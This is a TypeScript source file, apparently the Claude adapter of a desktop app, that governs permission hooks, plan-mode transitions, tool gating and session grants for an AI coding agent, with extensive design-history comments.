import type { ManagedPluginMcpServer } from '../managed-plugin-mcp'
import { managedTranscriptSettings } from './app-transcript-retention'
import { randomUUID } from 'node:crypto'
import {
  BUILT_IN_SKILLS_FAILURE,
  claudeBuiltInSkillOptions,
  verifyClaudeBuiltInSkills,
} from '../built-in-skills'
import { closeSync, existsSync, openSync, readdirSync, readSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { StringDecoder } from 'node:string_decoder'
import { query } from '@anthropic-ai/claude-agent-sdk'
import { claudeMcpServersFor, forbiddenExternalSpellings } from './agent-tools'
import type { ExternalMcpReach } from '../external-mcp'
import {
  boundInventory,
  parametersOf,
  qualifyWith,
  CLAUDE_TOOL_NAMING,
  type DeclaredToolset,
} from '../tool-inventory'
import { beyondItsRailsOf, type AgentToolset } from '../agent-tools'
import type {
  AccountInfo,
  EffortLevel,
  ElicitationRequest,
  ElicitationResult,
  ModelInfo,
  Options,
  PermissionMode,
  PermissionResult,
  PermissionUpdate,
  PermissionUpdateDestination,
  SDKMessage,
  SDKMessageOrigin,
  SDKUserMessage,
  Settings,
} from '@anthropic-ai/claude-agent-sdk'
import type { SessionStatus } from '@brobot2/shared'
import { handOverApiKey } from './api-key-handover'
import {
  type ClaudeChildWitness,
  spawnClaudeChild,
  type SpawnChild,
  watchClaudeChild,
} from './claude-child'
import {
  aProgramTheSdkCouldNotFind,
  aProgramThatCouldNotRun,
  ClaudeUnavailableError,
} from './claude-binary'
import { AnswerRefused } from '../answer-refused'
// ⚑ **728 · MCP's own form, read by the reader the Codex adapter already has** — the SDK hands this
// adapter the four fields an MCP server sent that the card is built from (`serverName`, `message`,
// `mode`, `requestedSchema`), so one reader and one question builder serve both providers' server
// forms — and, since provider follow-ups 1, a `url` request's page. ⚠️ It also hands `elicitationId`
// and the server's own labels (`title`, `displayName`, `description`, from
// `_meta['anthropic/permissionDisplay']`); the card does not draw those yet.
import {
  codexElicitation,
  elicitationContent,
  elicitationQuestions,
  elicitationWords,
  opensALink,
  serverAsks,
  type CodexElicitation,
} from '../codex/external-mcp'
import { ApprovalModeSwitch, type ApprovalModeState } from '../approval-mode'
import { NextTurnSetting } from '../next-turn'
import { boundPermissionDetail, MAX_PERMISSION_DETAIL_CHARS, type RuntimeEvent } from '../events'
import {
  answerToForward,
  duplicateAnswerKey,
  isAlwaysHonoured,
  persistenceOf,
  publishedOffer,
  type GrantRule,
  type PermissionDecision,
  type PermissionGrants,
  type PermissionOutcome,
  type PermissionScope,
  type PlanConsent,
  unanswerableOptionLabel,
  type UserInputQuestion,
  type UserInputResponse,
} from '../permission'
import {
  type BuiltInSkillsContext,
  type AgentInfo,
  type AgentRuntime,
  type ApprovalMode,
  isAutoApprove,
  type ModelChoice,
  type ProviderRuntimeContext,
  type ReasoningEffort,
  resolveReasoningEffort,
  ResumeError,
  type ResumeOptions,
  type SessionHandle,
  type SessionSettingsState,
  type StartOptions,
  type TurnProvenance,
} from '../runtime'
import type { LaunchSetting } from '../launch-settings'
import { sessionAccountFrom, type SessionAccount } from '../session-account'
import { sessionRefSchema, type SessionRef } from '../session-ref'
import { AsyncQueue } from '../internal/async-queue'
import {
  AuthUnavailableError,
  whyNoClaudeLogin,
  type ClaudeApiKeyProviderAsync,
  type ClaudeAuthTokenProvider,
  type ClaudeAuthTokenProviderAsync,
  credentialFingerprint,
  signInTagOf,
} from '../internal/auth'
import { buildChildEnv } from '../internal/child-env'
import {
  assertNotCancelled,
  cancelWith,
  didNotAnswerInTime,
  withDeadline,
  withTimeout,
} from '../internal/bounded'
import { isWithin, type SessionConfinement } from '../internal/confinement'
import { realResolve } from '../internal/real-path'
import { DeltaCoalescer } from '../internal/delta-coalescer'
import { endsOpenSubAgents, OpenSubAgents } from '../internal/open-sub-agents'
import { isProviderWork } from '../internal/provider-work'
import { RequestBroker } from '../internal/request-broker'
import { SessionMachine } from '../internal/session-machine'
import { isReasoning, StallWatchdog, stallNotice } from '../internal/stall-watchdog'
import { claudeAutoMemoryDir } from './auto-memory'
import { localSettingsFilesOf } from './local-settings-location'
import { keptRulesForALaunch } from './persisted-rules'
import { FileEdits } from './file-edits'
import { ClaudeMemoryStore } from './memory-store'
import { AnnouncedCli } from './provider-refusal'
import {
  claudeConversationReset,
  refAfterReset,
  claudeResultOutcome,
  ClaudeBillingWatch,
  ClaudeLimitWatch,
  claudeSessionRef,
  normalizeMessage,
  readCommand,
} from './normalize'
import { ToolAnswers, type ToolAnswer } from '../tool-answer'
import { ClaudeMessageReceipts } from './message-receipts'
import {
  boundCommands,
  CLAUDE_COMMAND_PREFIX,
  type ProviderCommandAnswer,
} from '../provider-commands'
import { wordsForACard } from '../words-on-a-card'
import { BackgroundTasks } from './background-tasks'
import { SessionCrons } from './session-crons'
import { SchedulingCalls } from './scheduling-calls'
import { SCHEDULING_TOOLS } from '../scheduled-work'
import { SubAgentTasks } from './sub-agent-tasks'
import { WorkflowTasks } from './workflow-tasks'
import { TodoPlan } from './todo-plan'
import { CLAUDE_DEFAULT_BY_NAME } from './default-by-name'

/** File-mutating Claude tools → `permission_request.kind = 'file'`; all others → `'command'`. */
const FILE_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])
/**
 * Tools whose declared path is the WHOLE of what they do — the test {@link claudeScope} applies for
 * full disclosure, and therefore for offering the narrow session grant (071).
 *
 * A superset of {@link FILE_TOOLS} and a different question: that set decides what KIND of card this
 * is (a file change, or something else), this one decides whether the card's `paths` describe the
 * request completely. Reading `/etc/hosts` and writing it are the same disclosure and different
 * kinds, so one set could not answer both without lying about one of them.
 */
const PATH_COMPLETE_TOOLS = new Set([...FILE_TOOLS, 'Read', 'NotebookRead'])
/**
 * Tools that are questions/plans, not command/file approvals → `user_input_request`.
 *
 * ⚠️ **THIS SET IS AN ENVIRONMENT FACT, AND IT HAS ALREADY MOVED ONCE (056).** Which tool exists,
 * and which one a plan arrives through, is decided by a binary we do not ship and do not pin. 028
 * learned it when `TodoWrite` never fired and `TaskCreate`/`TaskUpdate` did; 029 learned it when
 * "Codex has no sub-agents" was hardened into a test and then falsified; 030 learned it when "Codex
 * has no plan mode" turned out to be read off the wrong signal. A name in this set is a bet on
 * someone else's release notes, so the set is written to be WIDER than what any one capture shows.
 *
 * `EnterPlanMode` joined in 056, measured rather than guessed: our own ledger has it called at
 * `sess_423479cd…` ordinal 35 (2026-08-03), and until then it fell through to the permission guard
 * and surfaced as a COMMAND card — `kind:'command'`, `action:'EnterPlanMode'`,
 * `detail:'EnterPlanMode'`, `underDisclosed:true`. It is not a command. Its declared input is
 * `EnterPlanModeInput {}` (sdk-tools.d.ts:2767) and its output is a bare
 * `{message: string}` (:4075) — it runs nothing, touches nothing, and its own tool description says
 * it "REQUIRES user approval — they must consent to entering plan mode". That is a question, and
 * this is where questions live.
 *
 * 🔴 **736 · R98 — the CLI itself does not ask it** (measured, `probe:tool-calls-as-the-cli`
 * `enter-plan-write`: the tool description's words are for the MODEL, and the CLI's own engine
 * never handed `EnterPlanMode` to its host). So it is routed here only so the callback can allow it
 * and settle the plan state, in every mode — {@link CONSENT_ONLY_USER_INPUT} — never to a person.
 */
const USER_INPUT_TOOLS = new Set(['AskUserQuestion', 'ExitPlanMode', 'EnterPlanMode'])

/**
 * 🔴 **The two cards that MOVE plan mode, and which way approving one moves it** (150).
 *
 * ⛔ **The floor was one-way, and that bricked a session in the field.** `plan.request(true)` was the
 * only writer this class ever had, `setPlanMode(false)` refuses by design (076), and
 * {@link ClaudeSessionHandle.planning} — which is what {@link promptGuardHooks}'s read-only floor
 * read, until `728` (R93) removed the floor — is `plan.effective`. So nothing anywhere could put it back. The model called
 * `ExitPlanMode`, the user APPROVED it, the SDK left plan mode and said so, and BroBot's own floor
 * stayed up: every `Bash` and every `Write` refused with the planning message, permanently, with no
 * gesture left that could lift it. The conversation could read and nothing else, for life.
 *
 * ⚑ **076 recorded the asymmetry and it was harmless until 140 built on it.** Its own docstring said
 * *"the approval happened inside the SDK where we cannot see it"* — true of the SDK's mode, and
 * false of the APPROVAL, which arrives here as an answer to a card this adapter raised itself. 140
 * then added a second floor above the provider's that reads the same flag, and turned a recorded
 * asymmetry into a bricked session. 140's whole point was *who guarantees it*; the guarantor could
 * not see the release.
 *
 * ⚠️ **Both directions, because the state has two edges and the tester named both.** The first plan
 * bug was UI → provider (a toggle that never reached plan mode); this one is provider → guard
 * (an exit that never reached the floor). `EnterPlanMode` is the mirror: the model asks to START
 * planning, the SDK enters plan mode — and without this line BroBot would not know it was planning
 * while the CLI was. ⚑ Since `736` (R98) nobody approves that start: the CLI does not ask, so the
 * allow of `EnterPlanMode` settles it in every mode, and only `ExitPlanMode` is a person's card. ⚑ **Since `728` (R93) there is no floor**, and what this
 * state decides is what `planning` decides: whether `auto` answers the CLI's plan-mode asks or leaves
 * them to the person, and whether a card offers a conversation grant. A missed gesture is `auto`
 * answering them unseen — why `auto`'s allow of `EnterPlanMode` settles it too.
 *
 * 🔒 **Approval only.** A REJECTED plan leaves the state exactly where it was: refusing to approve a
 * plan is not a request to start work.
 */
const PLAN_GESTURES = new Map<string, boolean>([
  ['ExitPlanMode', false],
  ['EnterPlanMode', true],
])

/**
 * ⛔ **The same gesture, said on the EVENT** (478) — and NO KEY AT ALL where nothing moves.
 *
 * ⚑ **Takes the gesture rather than the tool name**, so it cannot be called anywhere
 * {@link PLAN_GESTURES} has not already been consulted: the card's promise and the transition
 * {@link ClaudeSessionHandle.respondUserInput} performs read one value, once.
 *
 * ## ⛔ It returns an OBJECT TO SPREAD, and `consent: undefined` is not the same thing
 *
 * ⚠️ **Measured, not anticipated.** The first draft wrote `consent: planConsentOf(gesture)` into
 * the event literal, which puts an own enumerable `consent` key on every `AskUserQuestion` with
 * `undefined` under it — and `askedOfTheChannel`'s admit-list walks `Object.keys`, which does not
 * care what the value is. ⛔ **Every Claude question stopped travelling to a parent**, classified
 * `a-shape-this-app-has-not-been-taught`, and `claude-runtime.test.ts`'s own `394` case is what
 * said so. ⚑ An absent key is what `question-channel.ts`' `QUESTION_REQUEST_KEYS` means by absent.
 */
function planConsentOf(gesture: boolean | undefined): { consent?: PlanConsent } {
  if (gesture === undefined) return {}
  return { consent: gesture ? 'start-planning' : 'stop-planning' }
}

/**
 * The user-input tools this app answers for itself, with no card — 🔴 **in EVERY mode since `736`
 * (R98)**; from 056 until then, only an UNATTENDED session did, and an `ask` one drew a consent card
 * the CLI never raises (`728` F-11, measured). The history below is why the set exists at all.
 *
 * `USER_INPUT_TOOLS` is consulted BEFORE the auto-approve early return in {@link
 * ClaudeRuntime.handleCanUseTool} — and, since 063, before the mode check in {@link
 * promptGuardHooks} too, which is what makes the callback reachable in a launched-auto session at
 * all — deliberately: yolo skips permissions, and it cannot invent an
 * answer to a multiple-choice question or decide on the user's behalf that a plan is the right one.
 * That reasoning does not reach `EnterPlanMode`, and adding it without this set would have turned a
 * call that three auto sessions in our own ledger sailed through silently (`sess_0c003cfa…` ord 29,
 * `sess_408949ef…` ord 37, `sess_938acda0…` ord 155 — a `tool_call` and no card in any of them)
 * into a card that stops an unattended run until a human comes back. That is a worse bug than the
 * mislabelled card this dispatch set out to fix.
 *
 * ⚠️ **063 raised the stakes of this set and did not change its meaning.** A name added here now
 * blocks a launched-auto session as well as a switched-to-auto one, because the guard hook routes
 * every member to the callback regardless of mode. The exemption below is still the only way out,
 * and it is still the same one line — so the cost of getting this set wrong went up while the place
 * to fix it stayed exactly where it was.
 *
 * What earns a place here is carrying NOTHING the user has to see and NOTHING only they can decide:
 * `EnterPlanModeInput` is `{}`, and consenting to it makes the agent do LESS, not more. `AskUserQuestion`
 * carries a question and `ExitPlanMode` carries a plan, so neither can ever join.
 */
const CONSENT_ONLY_USER_INPUT = new Set(['EnterPlanMode'])

/*
 * ⛔ **`PROMPT_EXEMPT_TOOLS` is gone** (`728`, R93). It was the list of tools this app's hook raised
 * no card for (032, 071 — the read-only tools, `ToolSearch`, the todo tools), and until `728` every
 * tool NOT on it was forced to `ask`. With that ask removed the hook yields every call it has no
 * other reason to answer, so a list of the calls it yields for decided nothing: both of its exits
 * answered `{continue: true}` (`728`'s review). The CLI's own engine decides each of those tools,
 * as it does in the CLI — measured, it runs `Read`, `Grep` and `Glob` unasked in the working folder
 * and asks about a read outside it (`721`'s `probe:claude-scan-after-cd`).
 */

/**

/**
 * 🔴 **This app's OWN verbs whose rails are the whole gate, as the model must spell them** (486,
 * HO-031 §2.4).
 *
 * ## ⛔ The ruling
 *
 * ⚑ **HO-031 §2.4:** *"The brobot tools are gated by RAILS. Permissions are for acts that reach
 * outside this app."* ⚠️ **§2.9 is what it was ruled on:** a project manager needed a human
 * approval to call `mcp__brobot__reply_to_parent` — *"it had to ask permission to answer its
 * parent"* — and *"double-gating them means every task needs a human click to close, which breaks
 * the loop the tools exist to make."* ⛔ **The rails already answer *may you* for each of these
 * verbs, and they answer it better than a permission card can.**
 *
 * ## ⚠️ Per verb, never by a shared predicate, and the predicate is not this function
 *
 * ⛔ **Removing a gate is a WIDENING**, so it is opt-in one verb at a time — and the opt-in is the
 * `beyondItsRails` word on the verb's own declaration, beside the rails it is a claim about.
 * ⚑ **A name list here would be the widening written twice**, in a file that cannot see whether the
 * verb it names still exists; {@link BEYOND_ITS_RAILS} is required on every declaration, so a verb
 * added later cannot arrive un-classified and this set cannot outlive one that is renamed.
 *
 * ⛔ **`give_work` and `interrupt_agent` are NOT in it, and each says why in its own
 * declaration**: `give_work` can start a provider child outside this app, and `interrupt_agent`
 * destroys work in flight. A verb may also be in it for some calls only: it reads the call's own
 * arguments through `beyondItsRailsWhen`, so `message_agent` raises no card until it is asked to
 * stop the agent's turn, and then raises the one `interrupt_agent` does.
 *
 * ## 🔴 `allowFor`, and `{continue:true}` would not do it
 *
 * ⚠️ **The memory carve-out's argument, one exemption over.** Continuing means *the hook has no
 * opinion*, which hands the call to the SDK's permission engine — and with `settingSources: []`
 * the only rules it can find are the ones this app hands it (since `736`, the kept rules — `740`,
 * R99: the provider home's and the project's local settings, {@link keptRulesForALaunch}); absent one,
 * `canUseTool` is consulted and the
 * card appears. ⛔ **An MCP
 * tool is never auto-approved by the provider**, so a yield here would change nothing at all.
 *
 * ⚑ **The intersection with the session's own toolset is load-bearing** — the reason `461`'s
 * plan-mode set gave before `728` removed it: a session offered no toolset exempts nothing, and the
 * server the model must say is read off the toolset rather than spelled twice.
 */
function railsAreTheWholeGate(
  toolset: AgentToolset | undefined,
): (toolName: string, toolInput: unknown) => boolean {
  if (toolset === undefined) return () => false
  const byName = new Map(
    toolset.tools.map((one) => [qualifyWith(CLAUDE_TOOL_NAMING, toolset.server, one.name), one]),
  )
  return (toolName, toolInput) => {
    const tool = byName.get(toolName)
    return (
      tool !== undefined && beyondItsRailsOf(tool, toolInput) === 'nothing-its-rails-do-not-cover'
    )
  }
}

/**
 * 🔴 **The launch option that gives this session a way to FIND a file** (164 §1) — `Options.tools`.
 *
 * `preset:default` is the CLI's own token for *"everything you would normally offer"*; the two names
 * after it are added to that pool. Without them the child has no search tool at all, which is not a
 * quirk of this app's configuration — the pinned CLI drops both from its base pool on every platform
 * where `Bash` exists, and re-admits them only when a launch NAMES one of them. `Options.tools`
 * (`sdk.d.ts:1572`) says so in as many words: *"native builds may provide search via Bash
 * `find`/`grep` instead of the dedicated Grep/Glob tools. List Grep/Glob here or in `allowedTools`
 * to get them."*
 *
 * ⚑ **Measured, both levers, at the pinned 0.3.218** — `smoke/toolset-probe.smoke.ts`, real login,
 * `system:init` read off the wire:
 *
 * ```
 * baseline (what this app launched with)      32 tools   Grep:no   Glob:no
 * tools: ['preset:default','Grep','Glob']     34 tools   Grep:YES  Glob:YES   nothing lost
 * allowedTools: ['Grep','Glob']               34 tools   Grep:YES  Glob:YES   ⚠️ see below
 * ```
 *
 * ⛔ **`allowedTools` reaches the same list and is the wrong instrument, and the SDK says so itself.**
 * The probe's third launch emits `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED`: *"canUseTool will not be
 * invoked for: Grep, Glob. Bare allowedTools entries auto-approve the whole tool before the callback
 * is consulted."* That is 001 non-negotiable 1 in the SDK's own words — it would buy the vocabulary
 * by removing a door. `tools` buys the vocabulary and buys nothing else: it declares which built-ins
 * EXIST, grants no permission, creates no rule, and every call still arrives at
 * {@link promptGuardHooks} and `canUseTool` exactly as it did yesterday. The probe pins that
 * difference so the cheaper-looking option cannot be reached for later without re-reading it.
 *
 * ⚠️ **`preset:default` is load-bearing and is why this is a three-element array.** `--tools` with a
 * bare list is a NARROWING option: the CLI denies every base tool the list omits. `['Grep','Glob']`
 * alone would therefore hand plan mode its search by taking `Read`, `Write`, `Bash` and the rest
 * away from every other mode. The probe asserts the shape that matters — the option adds exactly
 * two names and loses none — because that is the failure this array would have if the token ever
 * stopped meaning what it means.
 *
 * ⚠️ **Set for EVERY session and not just planning ones.** A tool vocabulary is fixed for the life of
 * a query (`Options` are), so making it conditional on the plan bit would mean a session that starts
 * planning mid-conversation — `setPlanMode`, which {@link ClaudeSessionHandle.planning} exists to
 * support — kept the vocabulary of the session it used to be. It is also simply better: an ask-mode
 * session that can `Glob` raises an ordinary card for a tool that discloses one path, instead of one
 * for a shell.
 */
const SEARCH_TOOLS_VOCABULARY: readonly string[] = ['preset:default', 'Grep', 'Glob']

/**
 * ⚑ **Claude Code's own tools this app turns off on every launch.** An agent asks through
 * `ask_question`, which this app tracks and routes; a card from `AskUserQuestion` is neither.
 * ⛔ Never `ExitPlanMode`, whose card is how a plan is approved, nor `EnterPlanMode`, which asks
 * nobody; and never Claude's own sub-agents (`Agent`, `Workflow`).
 */
export const CLAUDE_TOOLS_TURNED_OFF: readonly string[] = ['AskUserQuestion']

/**
 * ⚑ **The settings a launch gave Claude Code that change what it sends its model**, read off the
 * very options it is launched with ({@link LaunchSetting}). ⚑ Commit attribution is Claude Code's
 * own unless the flag settings name it.
 */
export function claudeLaunchSettings(
  options: Pick<
    Options,
    'settingSources' | 'tools' | 'disallowedTools' | 'permissionMode' | 'env'
  > & {
    readonly settings: Settings
  },
  approval: ApprovalMode,
): LaunchSetting[] {
  const settings: Record<string, unknown> = { ...options.settings }
  return [
    { key: 'settings-sources', value: [...(options.settingSources ?? [])] },
    {
      key: 'memory-folder',
      value:
        typeof settings['autoMemoryDirectory'] === 'string'
          ? settings['autoMemoryDirectory']
          : null,
    },
    {
      key: 'built-in-tools',
      value: Array.isArray(options.tools)
        ? options.tools.filter((one) => typeof one === 'string')
        : null,
    },
    { key: 'denied-tools', value: [...(options.disallowedTools ?? [])] },
    {
      key: 'tools-off',
      value: CLAUDE_TOOLS_TURNED_OFF.filter((name) => options.disallowedTools?.includes(name)),
    },
    { key: 'mode', value: options.permissionMode ?? null },
    { key: 'connectors', value: options.env?.['ENABLE_CLAUDEAI_MCP_SERVERS'] !== 'false' },
    {
      key: 'attribution',
      value:
        'includeCoAuthoredBy' in settings || 'attribution' in settings ? 'set' : 'provider-default',
    },
    { key: 'approval', value: approval },
  ]
}

/**
 * The tools the user has approved **for this session** (031).
 *
 * ONE source of truth, deliberately, because the bug it fixes was two mechanisms disagreeing. The
 * SDK-side grant (`updatedPermissions`) is invisible to the `PreToolUse` hook — hooks run AHEAD of
 * permission rules — so a grant the SDK honoured was re-asked by the hook regardless, and "Approve
 * for session" did nothing at all. The hook and `canUseTool` now read the same set, so they cannot
 * drift apart. ⚑ **728** — the hook asks nothing of its own now and reads nothing here: the grant
 * itself is the CLI's rule, which the CLI honours — since `736` (R94) the CLI's OWN suggestion
 * ({@link sessionGrantOf}), so this set no longer keeps a per-file key of its own. What it still does
 * is DISCLOSE — {@link blanket} is what the header says was granted wholesale.
 *
 * Keyed by TOOL NAME, because that is the only thing the hook can match on: its input is
 * `{tool_name, tool_input}` and nothing else. Matching a narrower rule (a Bash *prefix*, say) would
 * mean re-implementing Claude's own matcher here — precisely the kind of guessing this codebase
 * refuses. Yielding is therefore not the same as ALLOWING: the hook stepping aside hands the call
 * to the SDK's rule engine, which applies the exact rules we sent. If they do not match, the SDK
 * asks again and the user gets a card. Narrow grant, narrow effect; we just stop pre-empting it.
 */
class SessionGrants {
  /**
   * The tools granted WHOLESALE (058) — every call, whatever its arguments.
   *
   * The only set left: `736` (R94) removed the per-file one beside it, because the conversation
   * grant is the CLI's own rule now and the CLI keeps it. What remains is the wholesale grants,
   * kept so {@link blanket} can report them to the header — whichever button installed one.
   */
  private readonly blanketGranted = new Set<string>()

  /**
   * Record that `toolName` was approved for the session **in full** — the grant 031 measured and
   * refused to make silently, made deliberately because the user pressed the button that says so.
   *
   * Unconditional: this grant's whole meaning is that it does not depend on the arguments, so there
   * is nothing to withhold it for.
   */
  grantAll(toolName: string): void {
    this.blanketGranted.add(toolName)
  }

  /** The wholesale grants, for disclosure. Insertion-ordered, which is the order they were made. */
  get blanket(): readonly string[] {
    return [...this.blanketGranted]
  }
}

/** The paths a call discloses — the same extraction {@link claudeScope} publishes on the card. */
function disclosedPaths(input: Record<string, unknown>): string[] {
  const paths: string[] = []
  for (const key of ['file_path', 'notebook_path', 'path']) {
    const value = input[key]
    if (typeof value === 'string' && value) paths.push(value)
  }
  return [...new Set(paths)].sort()
}

/**
 * A `PreToolUse` hook — and since `728` (R93) one that no longer ASKS on this app's own account.
 *
 * ⛔ **Until `728` it forced `permissionDecision:'ask'` for every tool outside
 * `PROMPT_EXEMPT_TOOLS`** (013, fixing 007 P1-6; the list is gone with the ask): hooks run ahead of permission rules, so no allow
 * rule could shadow it, and every consequential call reached `canUseTool` and its card. ⚑ R93: *"BroBot
 * never declines, narrows, rewrites or adds an ask on its own account."* Measured with this hook out
 * (`probe:tool-calls-as-the-cli`, its first twenty scenarios), the CLI's own engine asked everywhere this
 * hook asked except `ls`, `echo` and `git status` — so, of the calls measured, those three cards were
 * this app's own ask (other calls are the CLI's to decide and were not all measured), and it now answers
 * `{continue: true}` for every call it has no other reason to answer: the provider decides. ⚑ What it
 * still answers: a QUESTION is routed to the person in every mode (measured: the CLI's own unattended
 * mode still hands it to its host), this app's own rail-gated verbs are allowed in every mode,
 * planning or not (orchestration, which R93 keeps), and the folder rules that are `726`'s. The
 * plan-mode floor and the memory carve-out went with the ask (R93). ⚑ **`EnterPlanMode` rides the
 * question route and the CLI does NOT ask before it** (measured, `enter-plan-write`): since `736`
 * (R98) the callback allows it with no card in every mode — `728`'s F-11, closed.
 *
 * The paragraphs below are its history. ⚠️ Where they say the hook forces `ask`, refuses while
 * planning, or allows a memory write, that is what `728` removed; the rest is still here.
 *
 * It is built PER SESSION (031) rather than being a module constant, because it read that session's
 * {@link SessionGrants} until `728` and still reads its live mode. (031's reasoning — deleting the
 * hook would have reopened 007 P1-6, the CLI's own classifier auto-allowing a consequential tool —
 * is the ask R93 removed: the CLI's classifier is now what decides, as it does in the CLI.)
 *
 * ## It is installed in EVERY query now, and reads the mode LIVE (050, from 048 §1 finding 1)
 *
 * It used to be omitted whenever the session launched in `auto`, and that was the whole defect. The
 * `Options` of a query are fixed for the life of the session, so an auto session was permanently
 * built with `permissionMode: 'bypassPermissions'` and no guard — and under that mode the SDK
 * approves every tool call, except explicit deny rules, before `canUseTool` is consulted; only a
 * PreToolUse hook still gates every call. So when the user turned
 * unattended mode back OFF, `handleCanUseTool` — the only thing that publishes a card — was never
 * reached. The header said `ask`, the persisted state said `ask`, and consequential tools kept
 * running with nothing to click.
 *
 * The fix is that hook. The guard is now unconditional and asks the session
 * what mode it is in at the moment of the call:
 *
 * - **auto** → yield. Under `bypassPermissions` the SDK then auto-approves before the callback; in
 *   any other mode the call reaches {@link ClaudeSessionHandle.handleCanUseTool}, whose
 *   `isAutoApprove` early return allows it with no card — except while planning, where the CLI's own
 *   plan-mode ask reaches the person as the CLI would show it (`728`, measured). Returning
 *   `permissionDecision:'allow'` here would ALSO skip that plan-mode ask, which is why the hook
 *   yields rather than allows.
 * - **ask** → force `ask`, so the tool reaches `canUseTool` even under a mode that would otherwise
 *   shadow it.
 *
 * ## ⚠️ …except the tools where a human answer IS the operation (063, from 061 finding 3)
 *
 * The auto yield above used to be the FIRST thing this hook did, and that made a sentence two
 * paragraphs up false. It said "on the paths that DO reach the callback, the `USER_INPUT_TOOLS`
 * branch runs before the auto-approve early return, so `AskUserQuestion` still surfaces" — true, and
 * beside the point, because a session LAUNCHED in auto carries `permissionMode:'bypassPermissions'`,
 * and that mode approves *before the callback is consulted*. The guard
 * yielded, the SDK approved, and `handleCanUseTool` — the only thing that can publish a card — was
 * never reached. So the classification existed and could not be arrived at: **the model could ask a
 * question nobody would ever see, and proceed on the SDK's auto-answer.**
 *
 * `handleCanUseTool` already recorded this as an open question in its own comment ("Inferred, not
 * observed"). It is closed the only way it can be closed from this side: the hook now forces `ask`
 * for {@link USER_INPUT_TOOLS} **before** it consults the mode, so the callback is reached in every
 * mode and the classification always runs.
 *
 * **What the user then sees, and why that is the honest choice.** The card appears and the turn
 * waits — it is not auto-continued with a recorded note. Yolo means *"do not ask me to approve
 * actions"*; it cannot mean *"answer my questions for me"*, because there is no answer to invent.
 * `AskUserQuestion` carries a multiple-choice question and `ExitPlanMode` carries a plan, and 056
 * ruled on exactly this: neither is a consent-only tool. Auto-continuing would mean the SDK's
 * blanket approval standing in for a user decision — a plan approved by nobody — and then recording
 * it in the transcript as though it had been made. That is the fabrication pattern 035 removed.
 * BroBot2 is a desktop app with a window: an unattended session is unattended for *approvals*, and
 * the human is a room away, not absent.
 *
 * ⚠️ **This is the hazard 056 named, entered deliberately.** Every name in `USER_INPUT_TOOLS` now
 * blocks an unattended run at TWO sites, not one. It is the same set with the same meaning and the
 * decision still belongs to `handleCanUseTool` — this hook only guarantees that the decision is
 * *reached*, which is why {@link CONSENT_ONLY_USER_INPUT} keeps working untouched: `EnterPlanMode`
 * is routed to the callback and allowed there with no card — in an auto session instead of being
 * approved by the SDK before it, and since `736` (R98) in an `ask` one too, where it used to card.
 * Same outcome, one classifier, and the plan state settled at the one place that sees the allow.
 *
 * ⚠️ **What that last claim rests on, exactly.** The SDK does not state it. What it advises is a
 * PreToolUse hook as the way to gate a call `bypassPermissions` would approve — which only makes
 * sense if hooks are consulted first and an `ask` from one reaches the
 * callback; and 080 observed cards appearing in a yolo session that still had this guard installed,
 * which is that arrangement running against the real provider. Two pieces of evidence, one of them a
 * live measurement; the decision itself is made inside the CLI the SDK spawns.
 * `ui-live-smoke.mjs` step 22 is written to test it end to end against the provider, and is unrun.
 *
 * ⚠️ `effectiveMode` is a function, not a value, and that is the point. Reading the mode when the
 * `Options` were built is what produced a stale policy in the first place. It resolves to
 * `ApprovalModeSwitch.effective`, which only moves at a turn boundary (`send()` → `adopt()`), so the
 * tools of a turn already in flight stay governed by the mode that turn started under (034).
 */
/**
 * 🔴 **700 · every sentence this guard ASKS with — the whole set, because {@link askFor} takes a key
 * and not a sentence.**
 *
 * ⚑ **When only this guard wanted the card, the CLI hands the reason it asked with back to
 * `canUseTool` as `decisionReason`** — measured (`695`'s `probe:permission-markers`, unmarked arm):
 * *"brobot2 requires explicit approval for consequential tools"*. ⚠️ Where the CLI's own check asked
 * too, the reason is the CLI's (the marked arm: *"This command uses the `&` background operator…"*).
 * ⛔ **So a reason holding one of these is OUR words, not the provider's**, and
 * {@link providerReasonOf} refuses to carry it as the provider's. An `ask` exit through
 * {@link askFor} cannot name a sentence missing from here; ⚠️ one written as a bare
 * `hookSpecificOutput` literal would bypass the set, and there is none.
 */
const WHY_THIS_GUARD_ASKS = {
  questions: 'BroCrew routes questions and plans to the user, in every mode',
} as const

/** 🔴 700 · {@link WHY_THIS_GUARD_ASKS}, as the list {@link providerReasonOf} checks against. */
const OUR_OWN_ASK_REASONS: readonly string[] = Object.values(WHY_THIS_GUARD_ASKS)

/**
 * The hook's one way of saying "route this through `canUseTool`", with the reason it will show.
 *
 * A helper rather than a second literal (063): the guard has several `ask` exits for different
 * reasons — three since 700 counted them — and a copied object is how one of them would later
 * acquire a field the other lacks. ⚑ **700 · it takes a key of {@link WHY_THIS_GUARD_ASKS}**, so an
 * exit through here cannot ask with a sentence the provider's-reason check does not know is ours.
 */
function askFor(why: keyof typeof WHY_THIS_GUARD_ASKS) {
  return {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: 'ask',
      permissionDecisionReason: WHY_THIS_GUARD_ASKS[why],
    },
  } as const
}

/*
 * ⛔ **The hook's *no* is gone** (071 → `726` → `728`): it refused a path inside the app's own data
 * until `726` (R92), and the plan floor's calls and a memory write past its bound until `728` (R93).
 * The hook now says *ask* for a question and *yes* for this app's own verbs, and nothing else.
 */

/**
 * 🔴 **The hook's third terminal answer: *yes*, decided here so no card is published** (166 §2).
 *
 * ⛔ **This is the one word in this file that GRANTS, and it is deliberately rare** — one call site
 * since `728`: this app's own verbs whose rails are the whole gate ({@link railsAreTheWholeGate},
 * orchestration, which R93 keeps). ⚑ The memory carve-out that was its first call site (166 §2) is
 * gone: measured, the CLI's own engine writes a profile's memory without asking
 * (`probe:tool-calls-as-the-cli`, `memory`), so the allow here only ever repeated the provider.
 *
 * ⚠️ **`{continue:true}` would not do it.** Continuing means *the hook has no opinion*, which hands
 * the call to the SDK's permission engine — and with `settingSources: []` the only rules it can find
 * are the ones this app hands it (since `736`, R95, a kept *always* rule), so absent one an MCP tool
 * reaches `canUseTool` and the card appears: the provider does not auto-allow one (measured, `mcp`).
 *
 * ⚑ **The CLI honours it at the same layer it honours the deny**: a PreToolUse hook's
 * `permissionDecision` becomes the call's permission behaviour, and a PreToolUse hook is what still
 * gates every call when a permission mode would approve it first.
 */
function allowFor(reason: string) {
  return {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: 'allow',
      permissionDecisionReason: reason,
    },
  } as const
}

/**
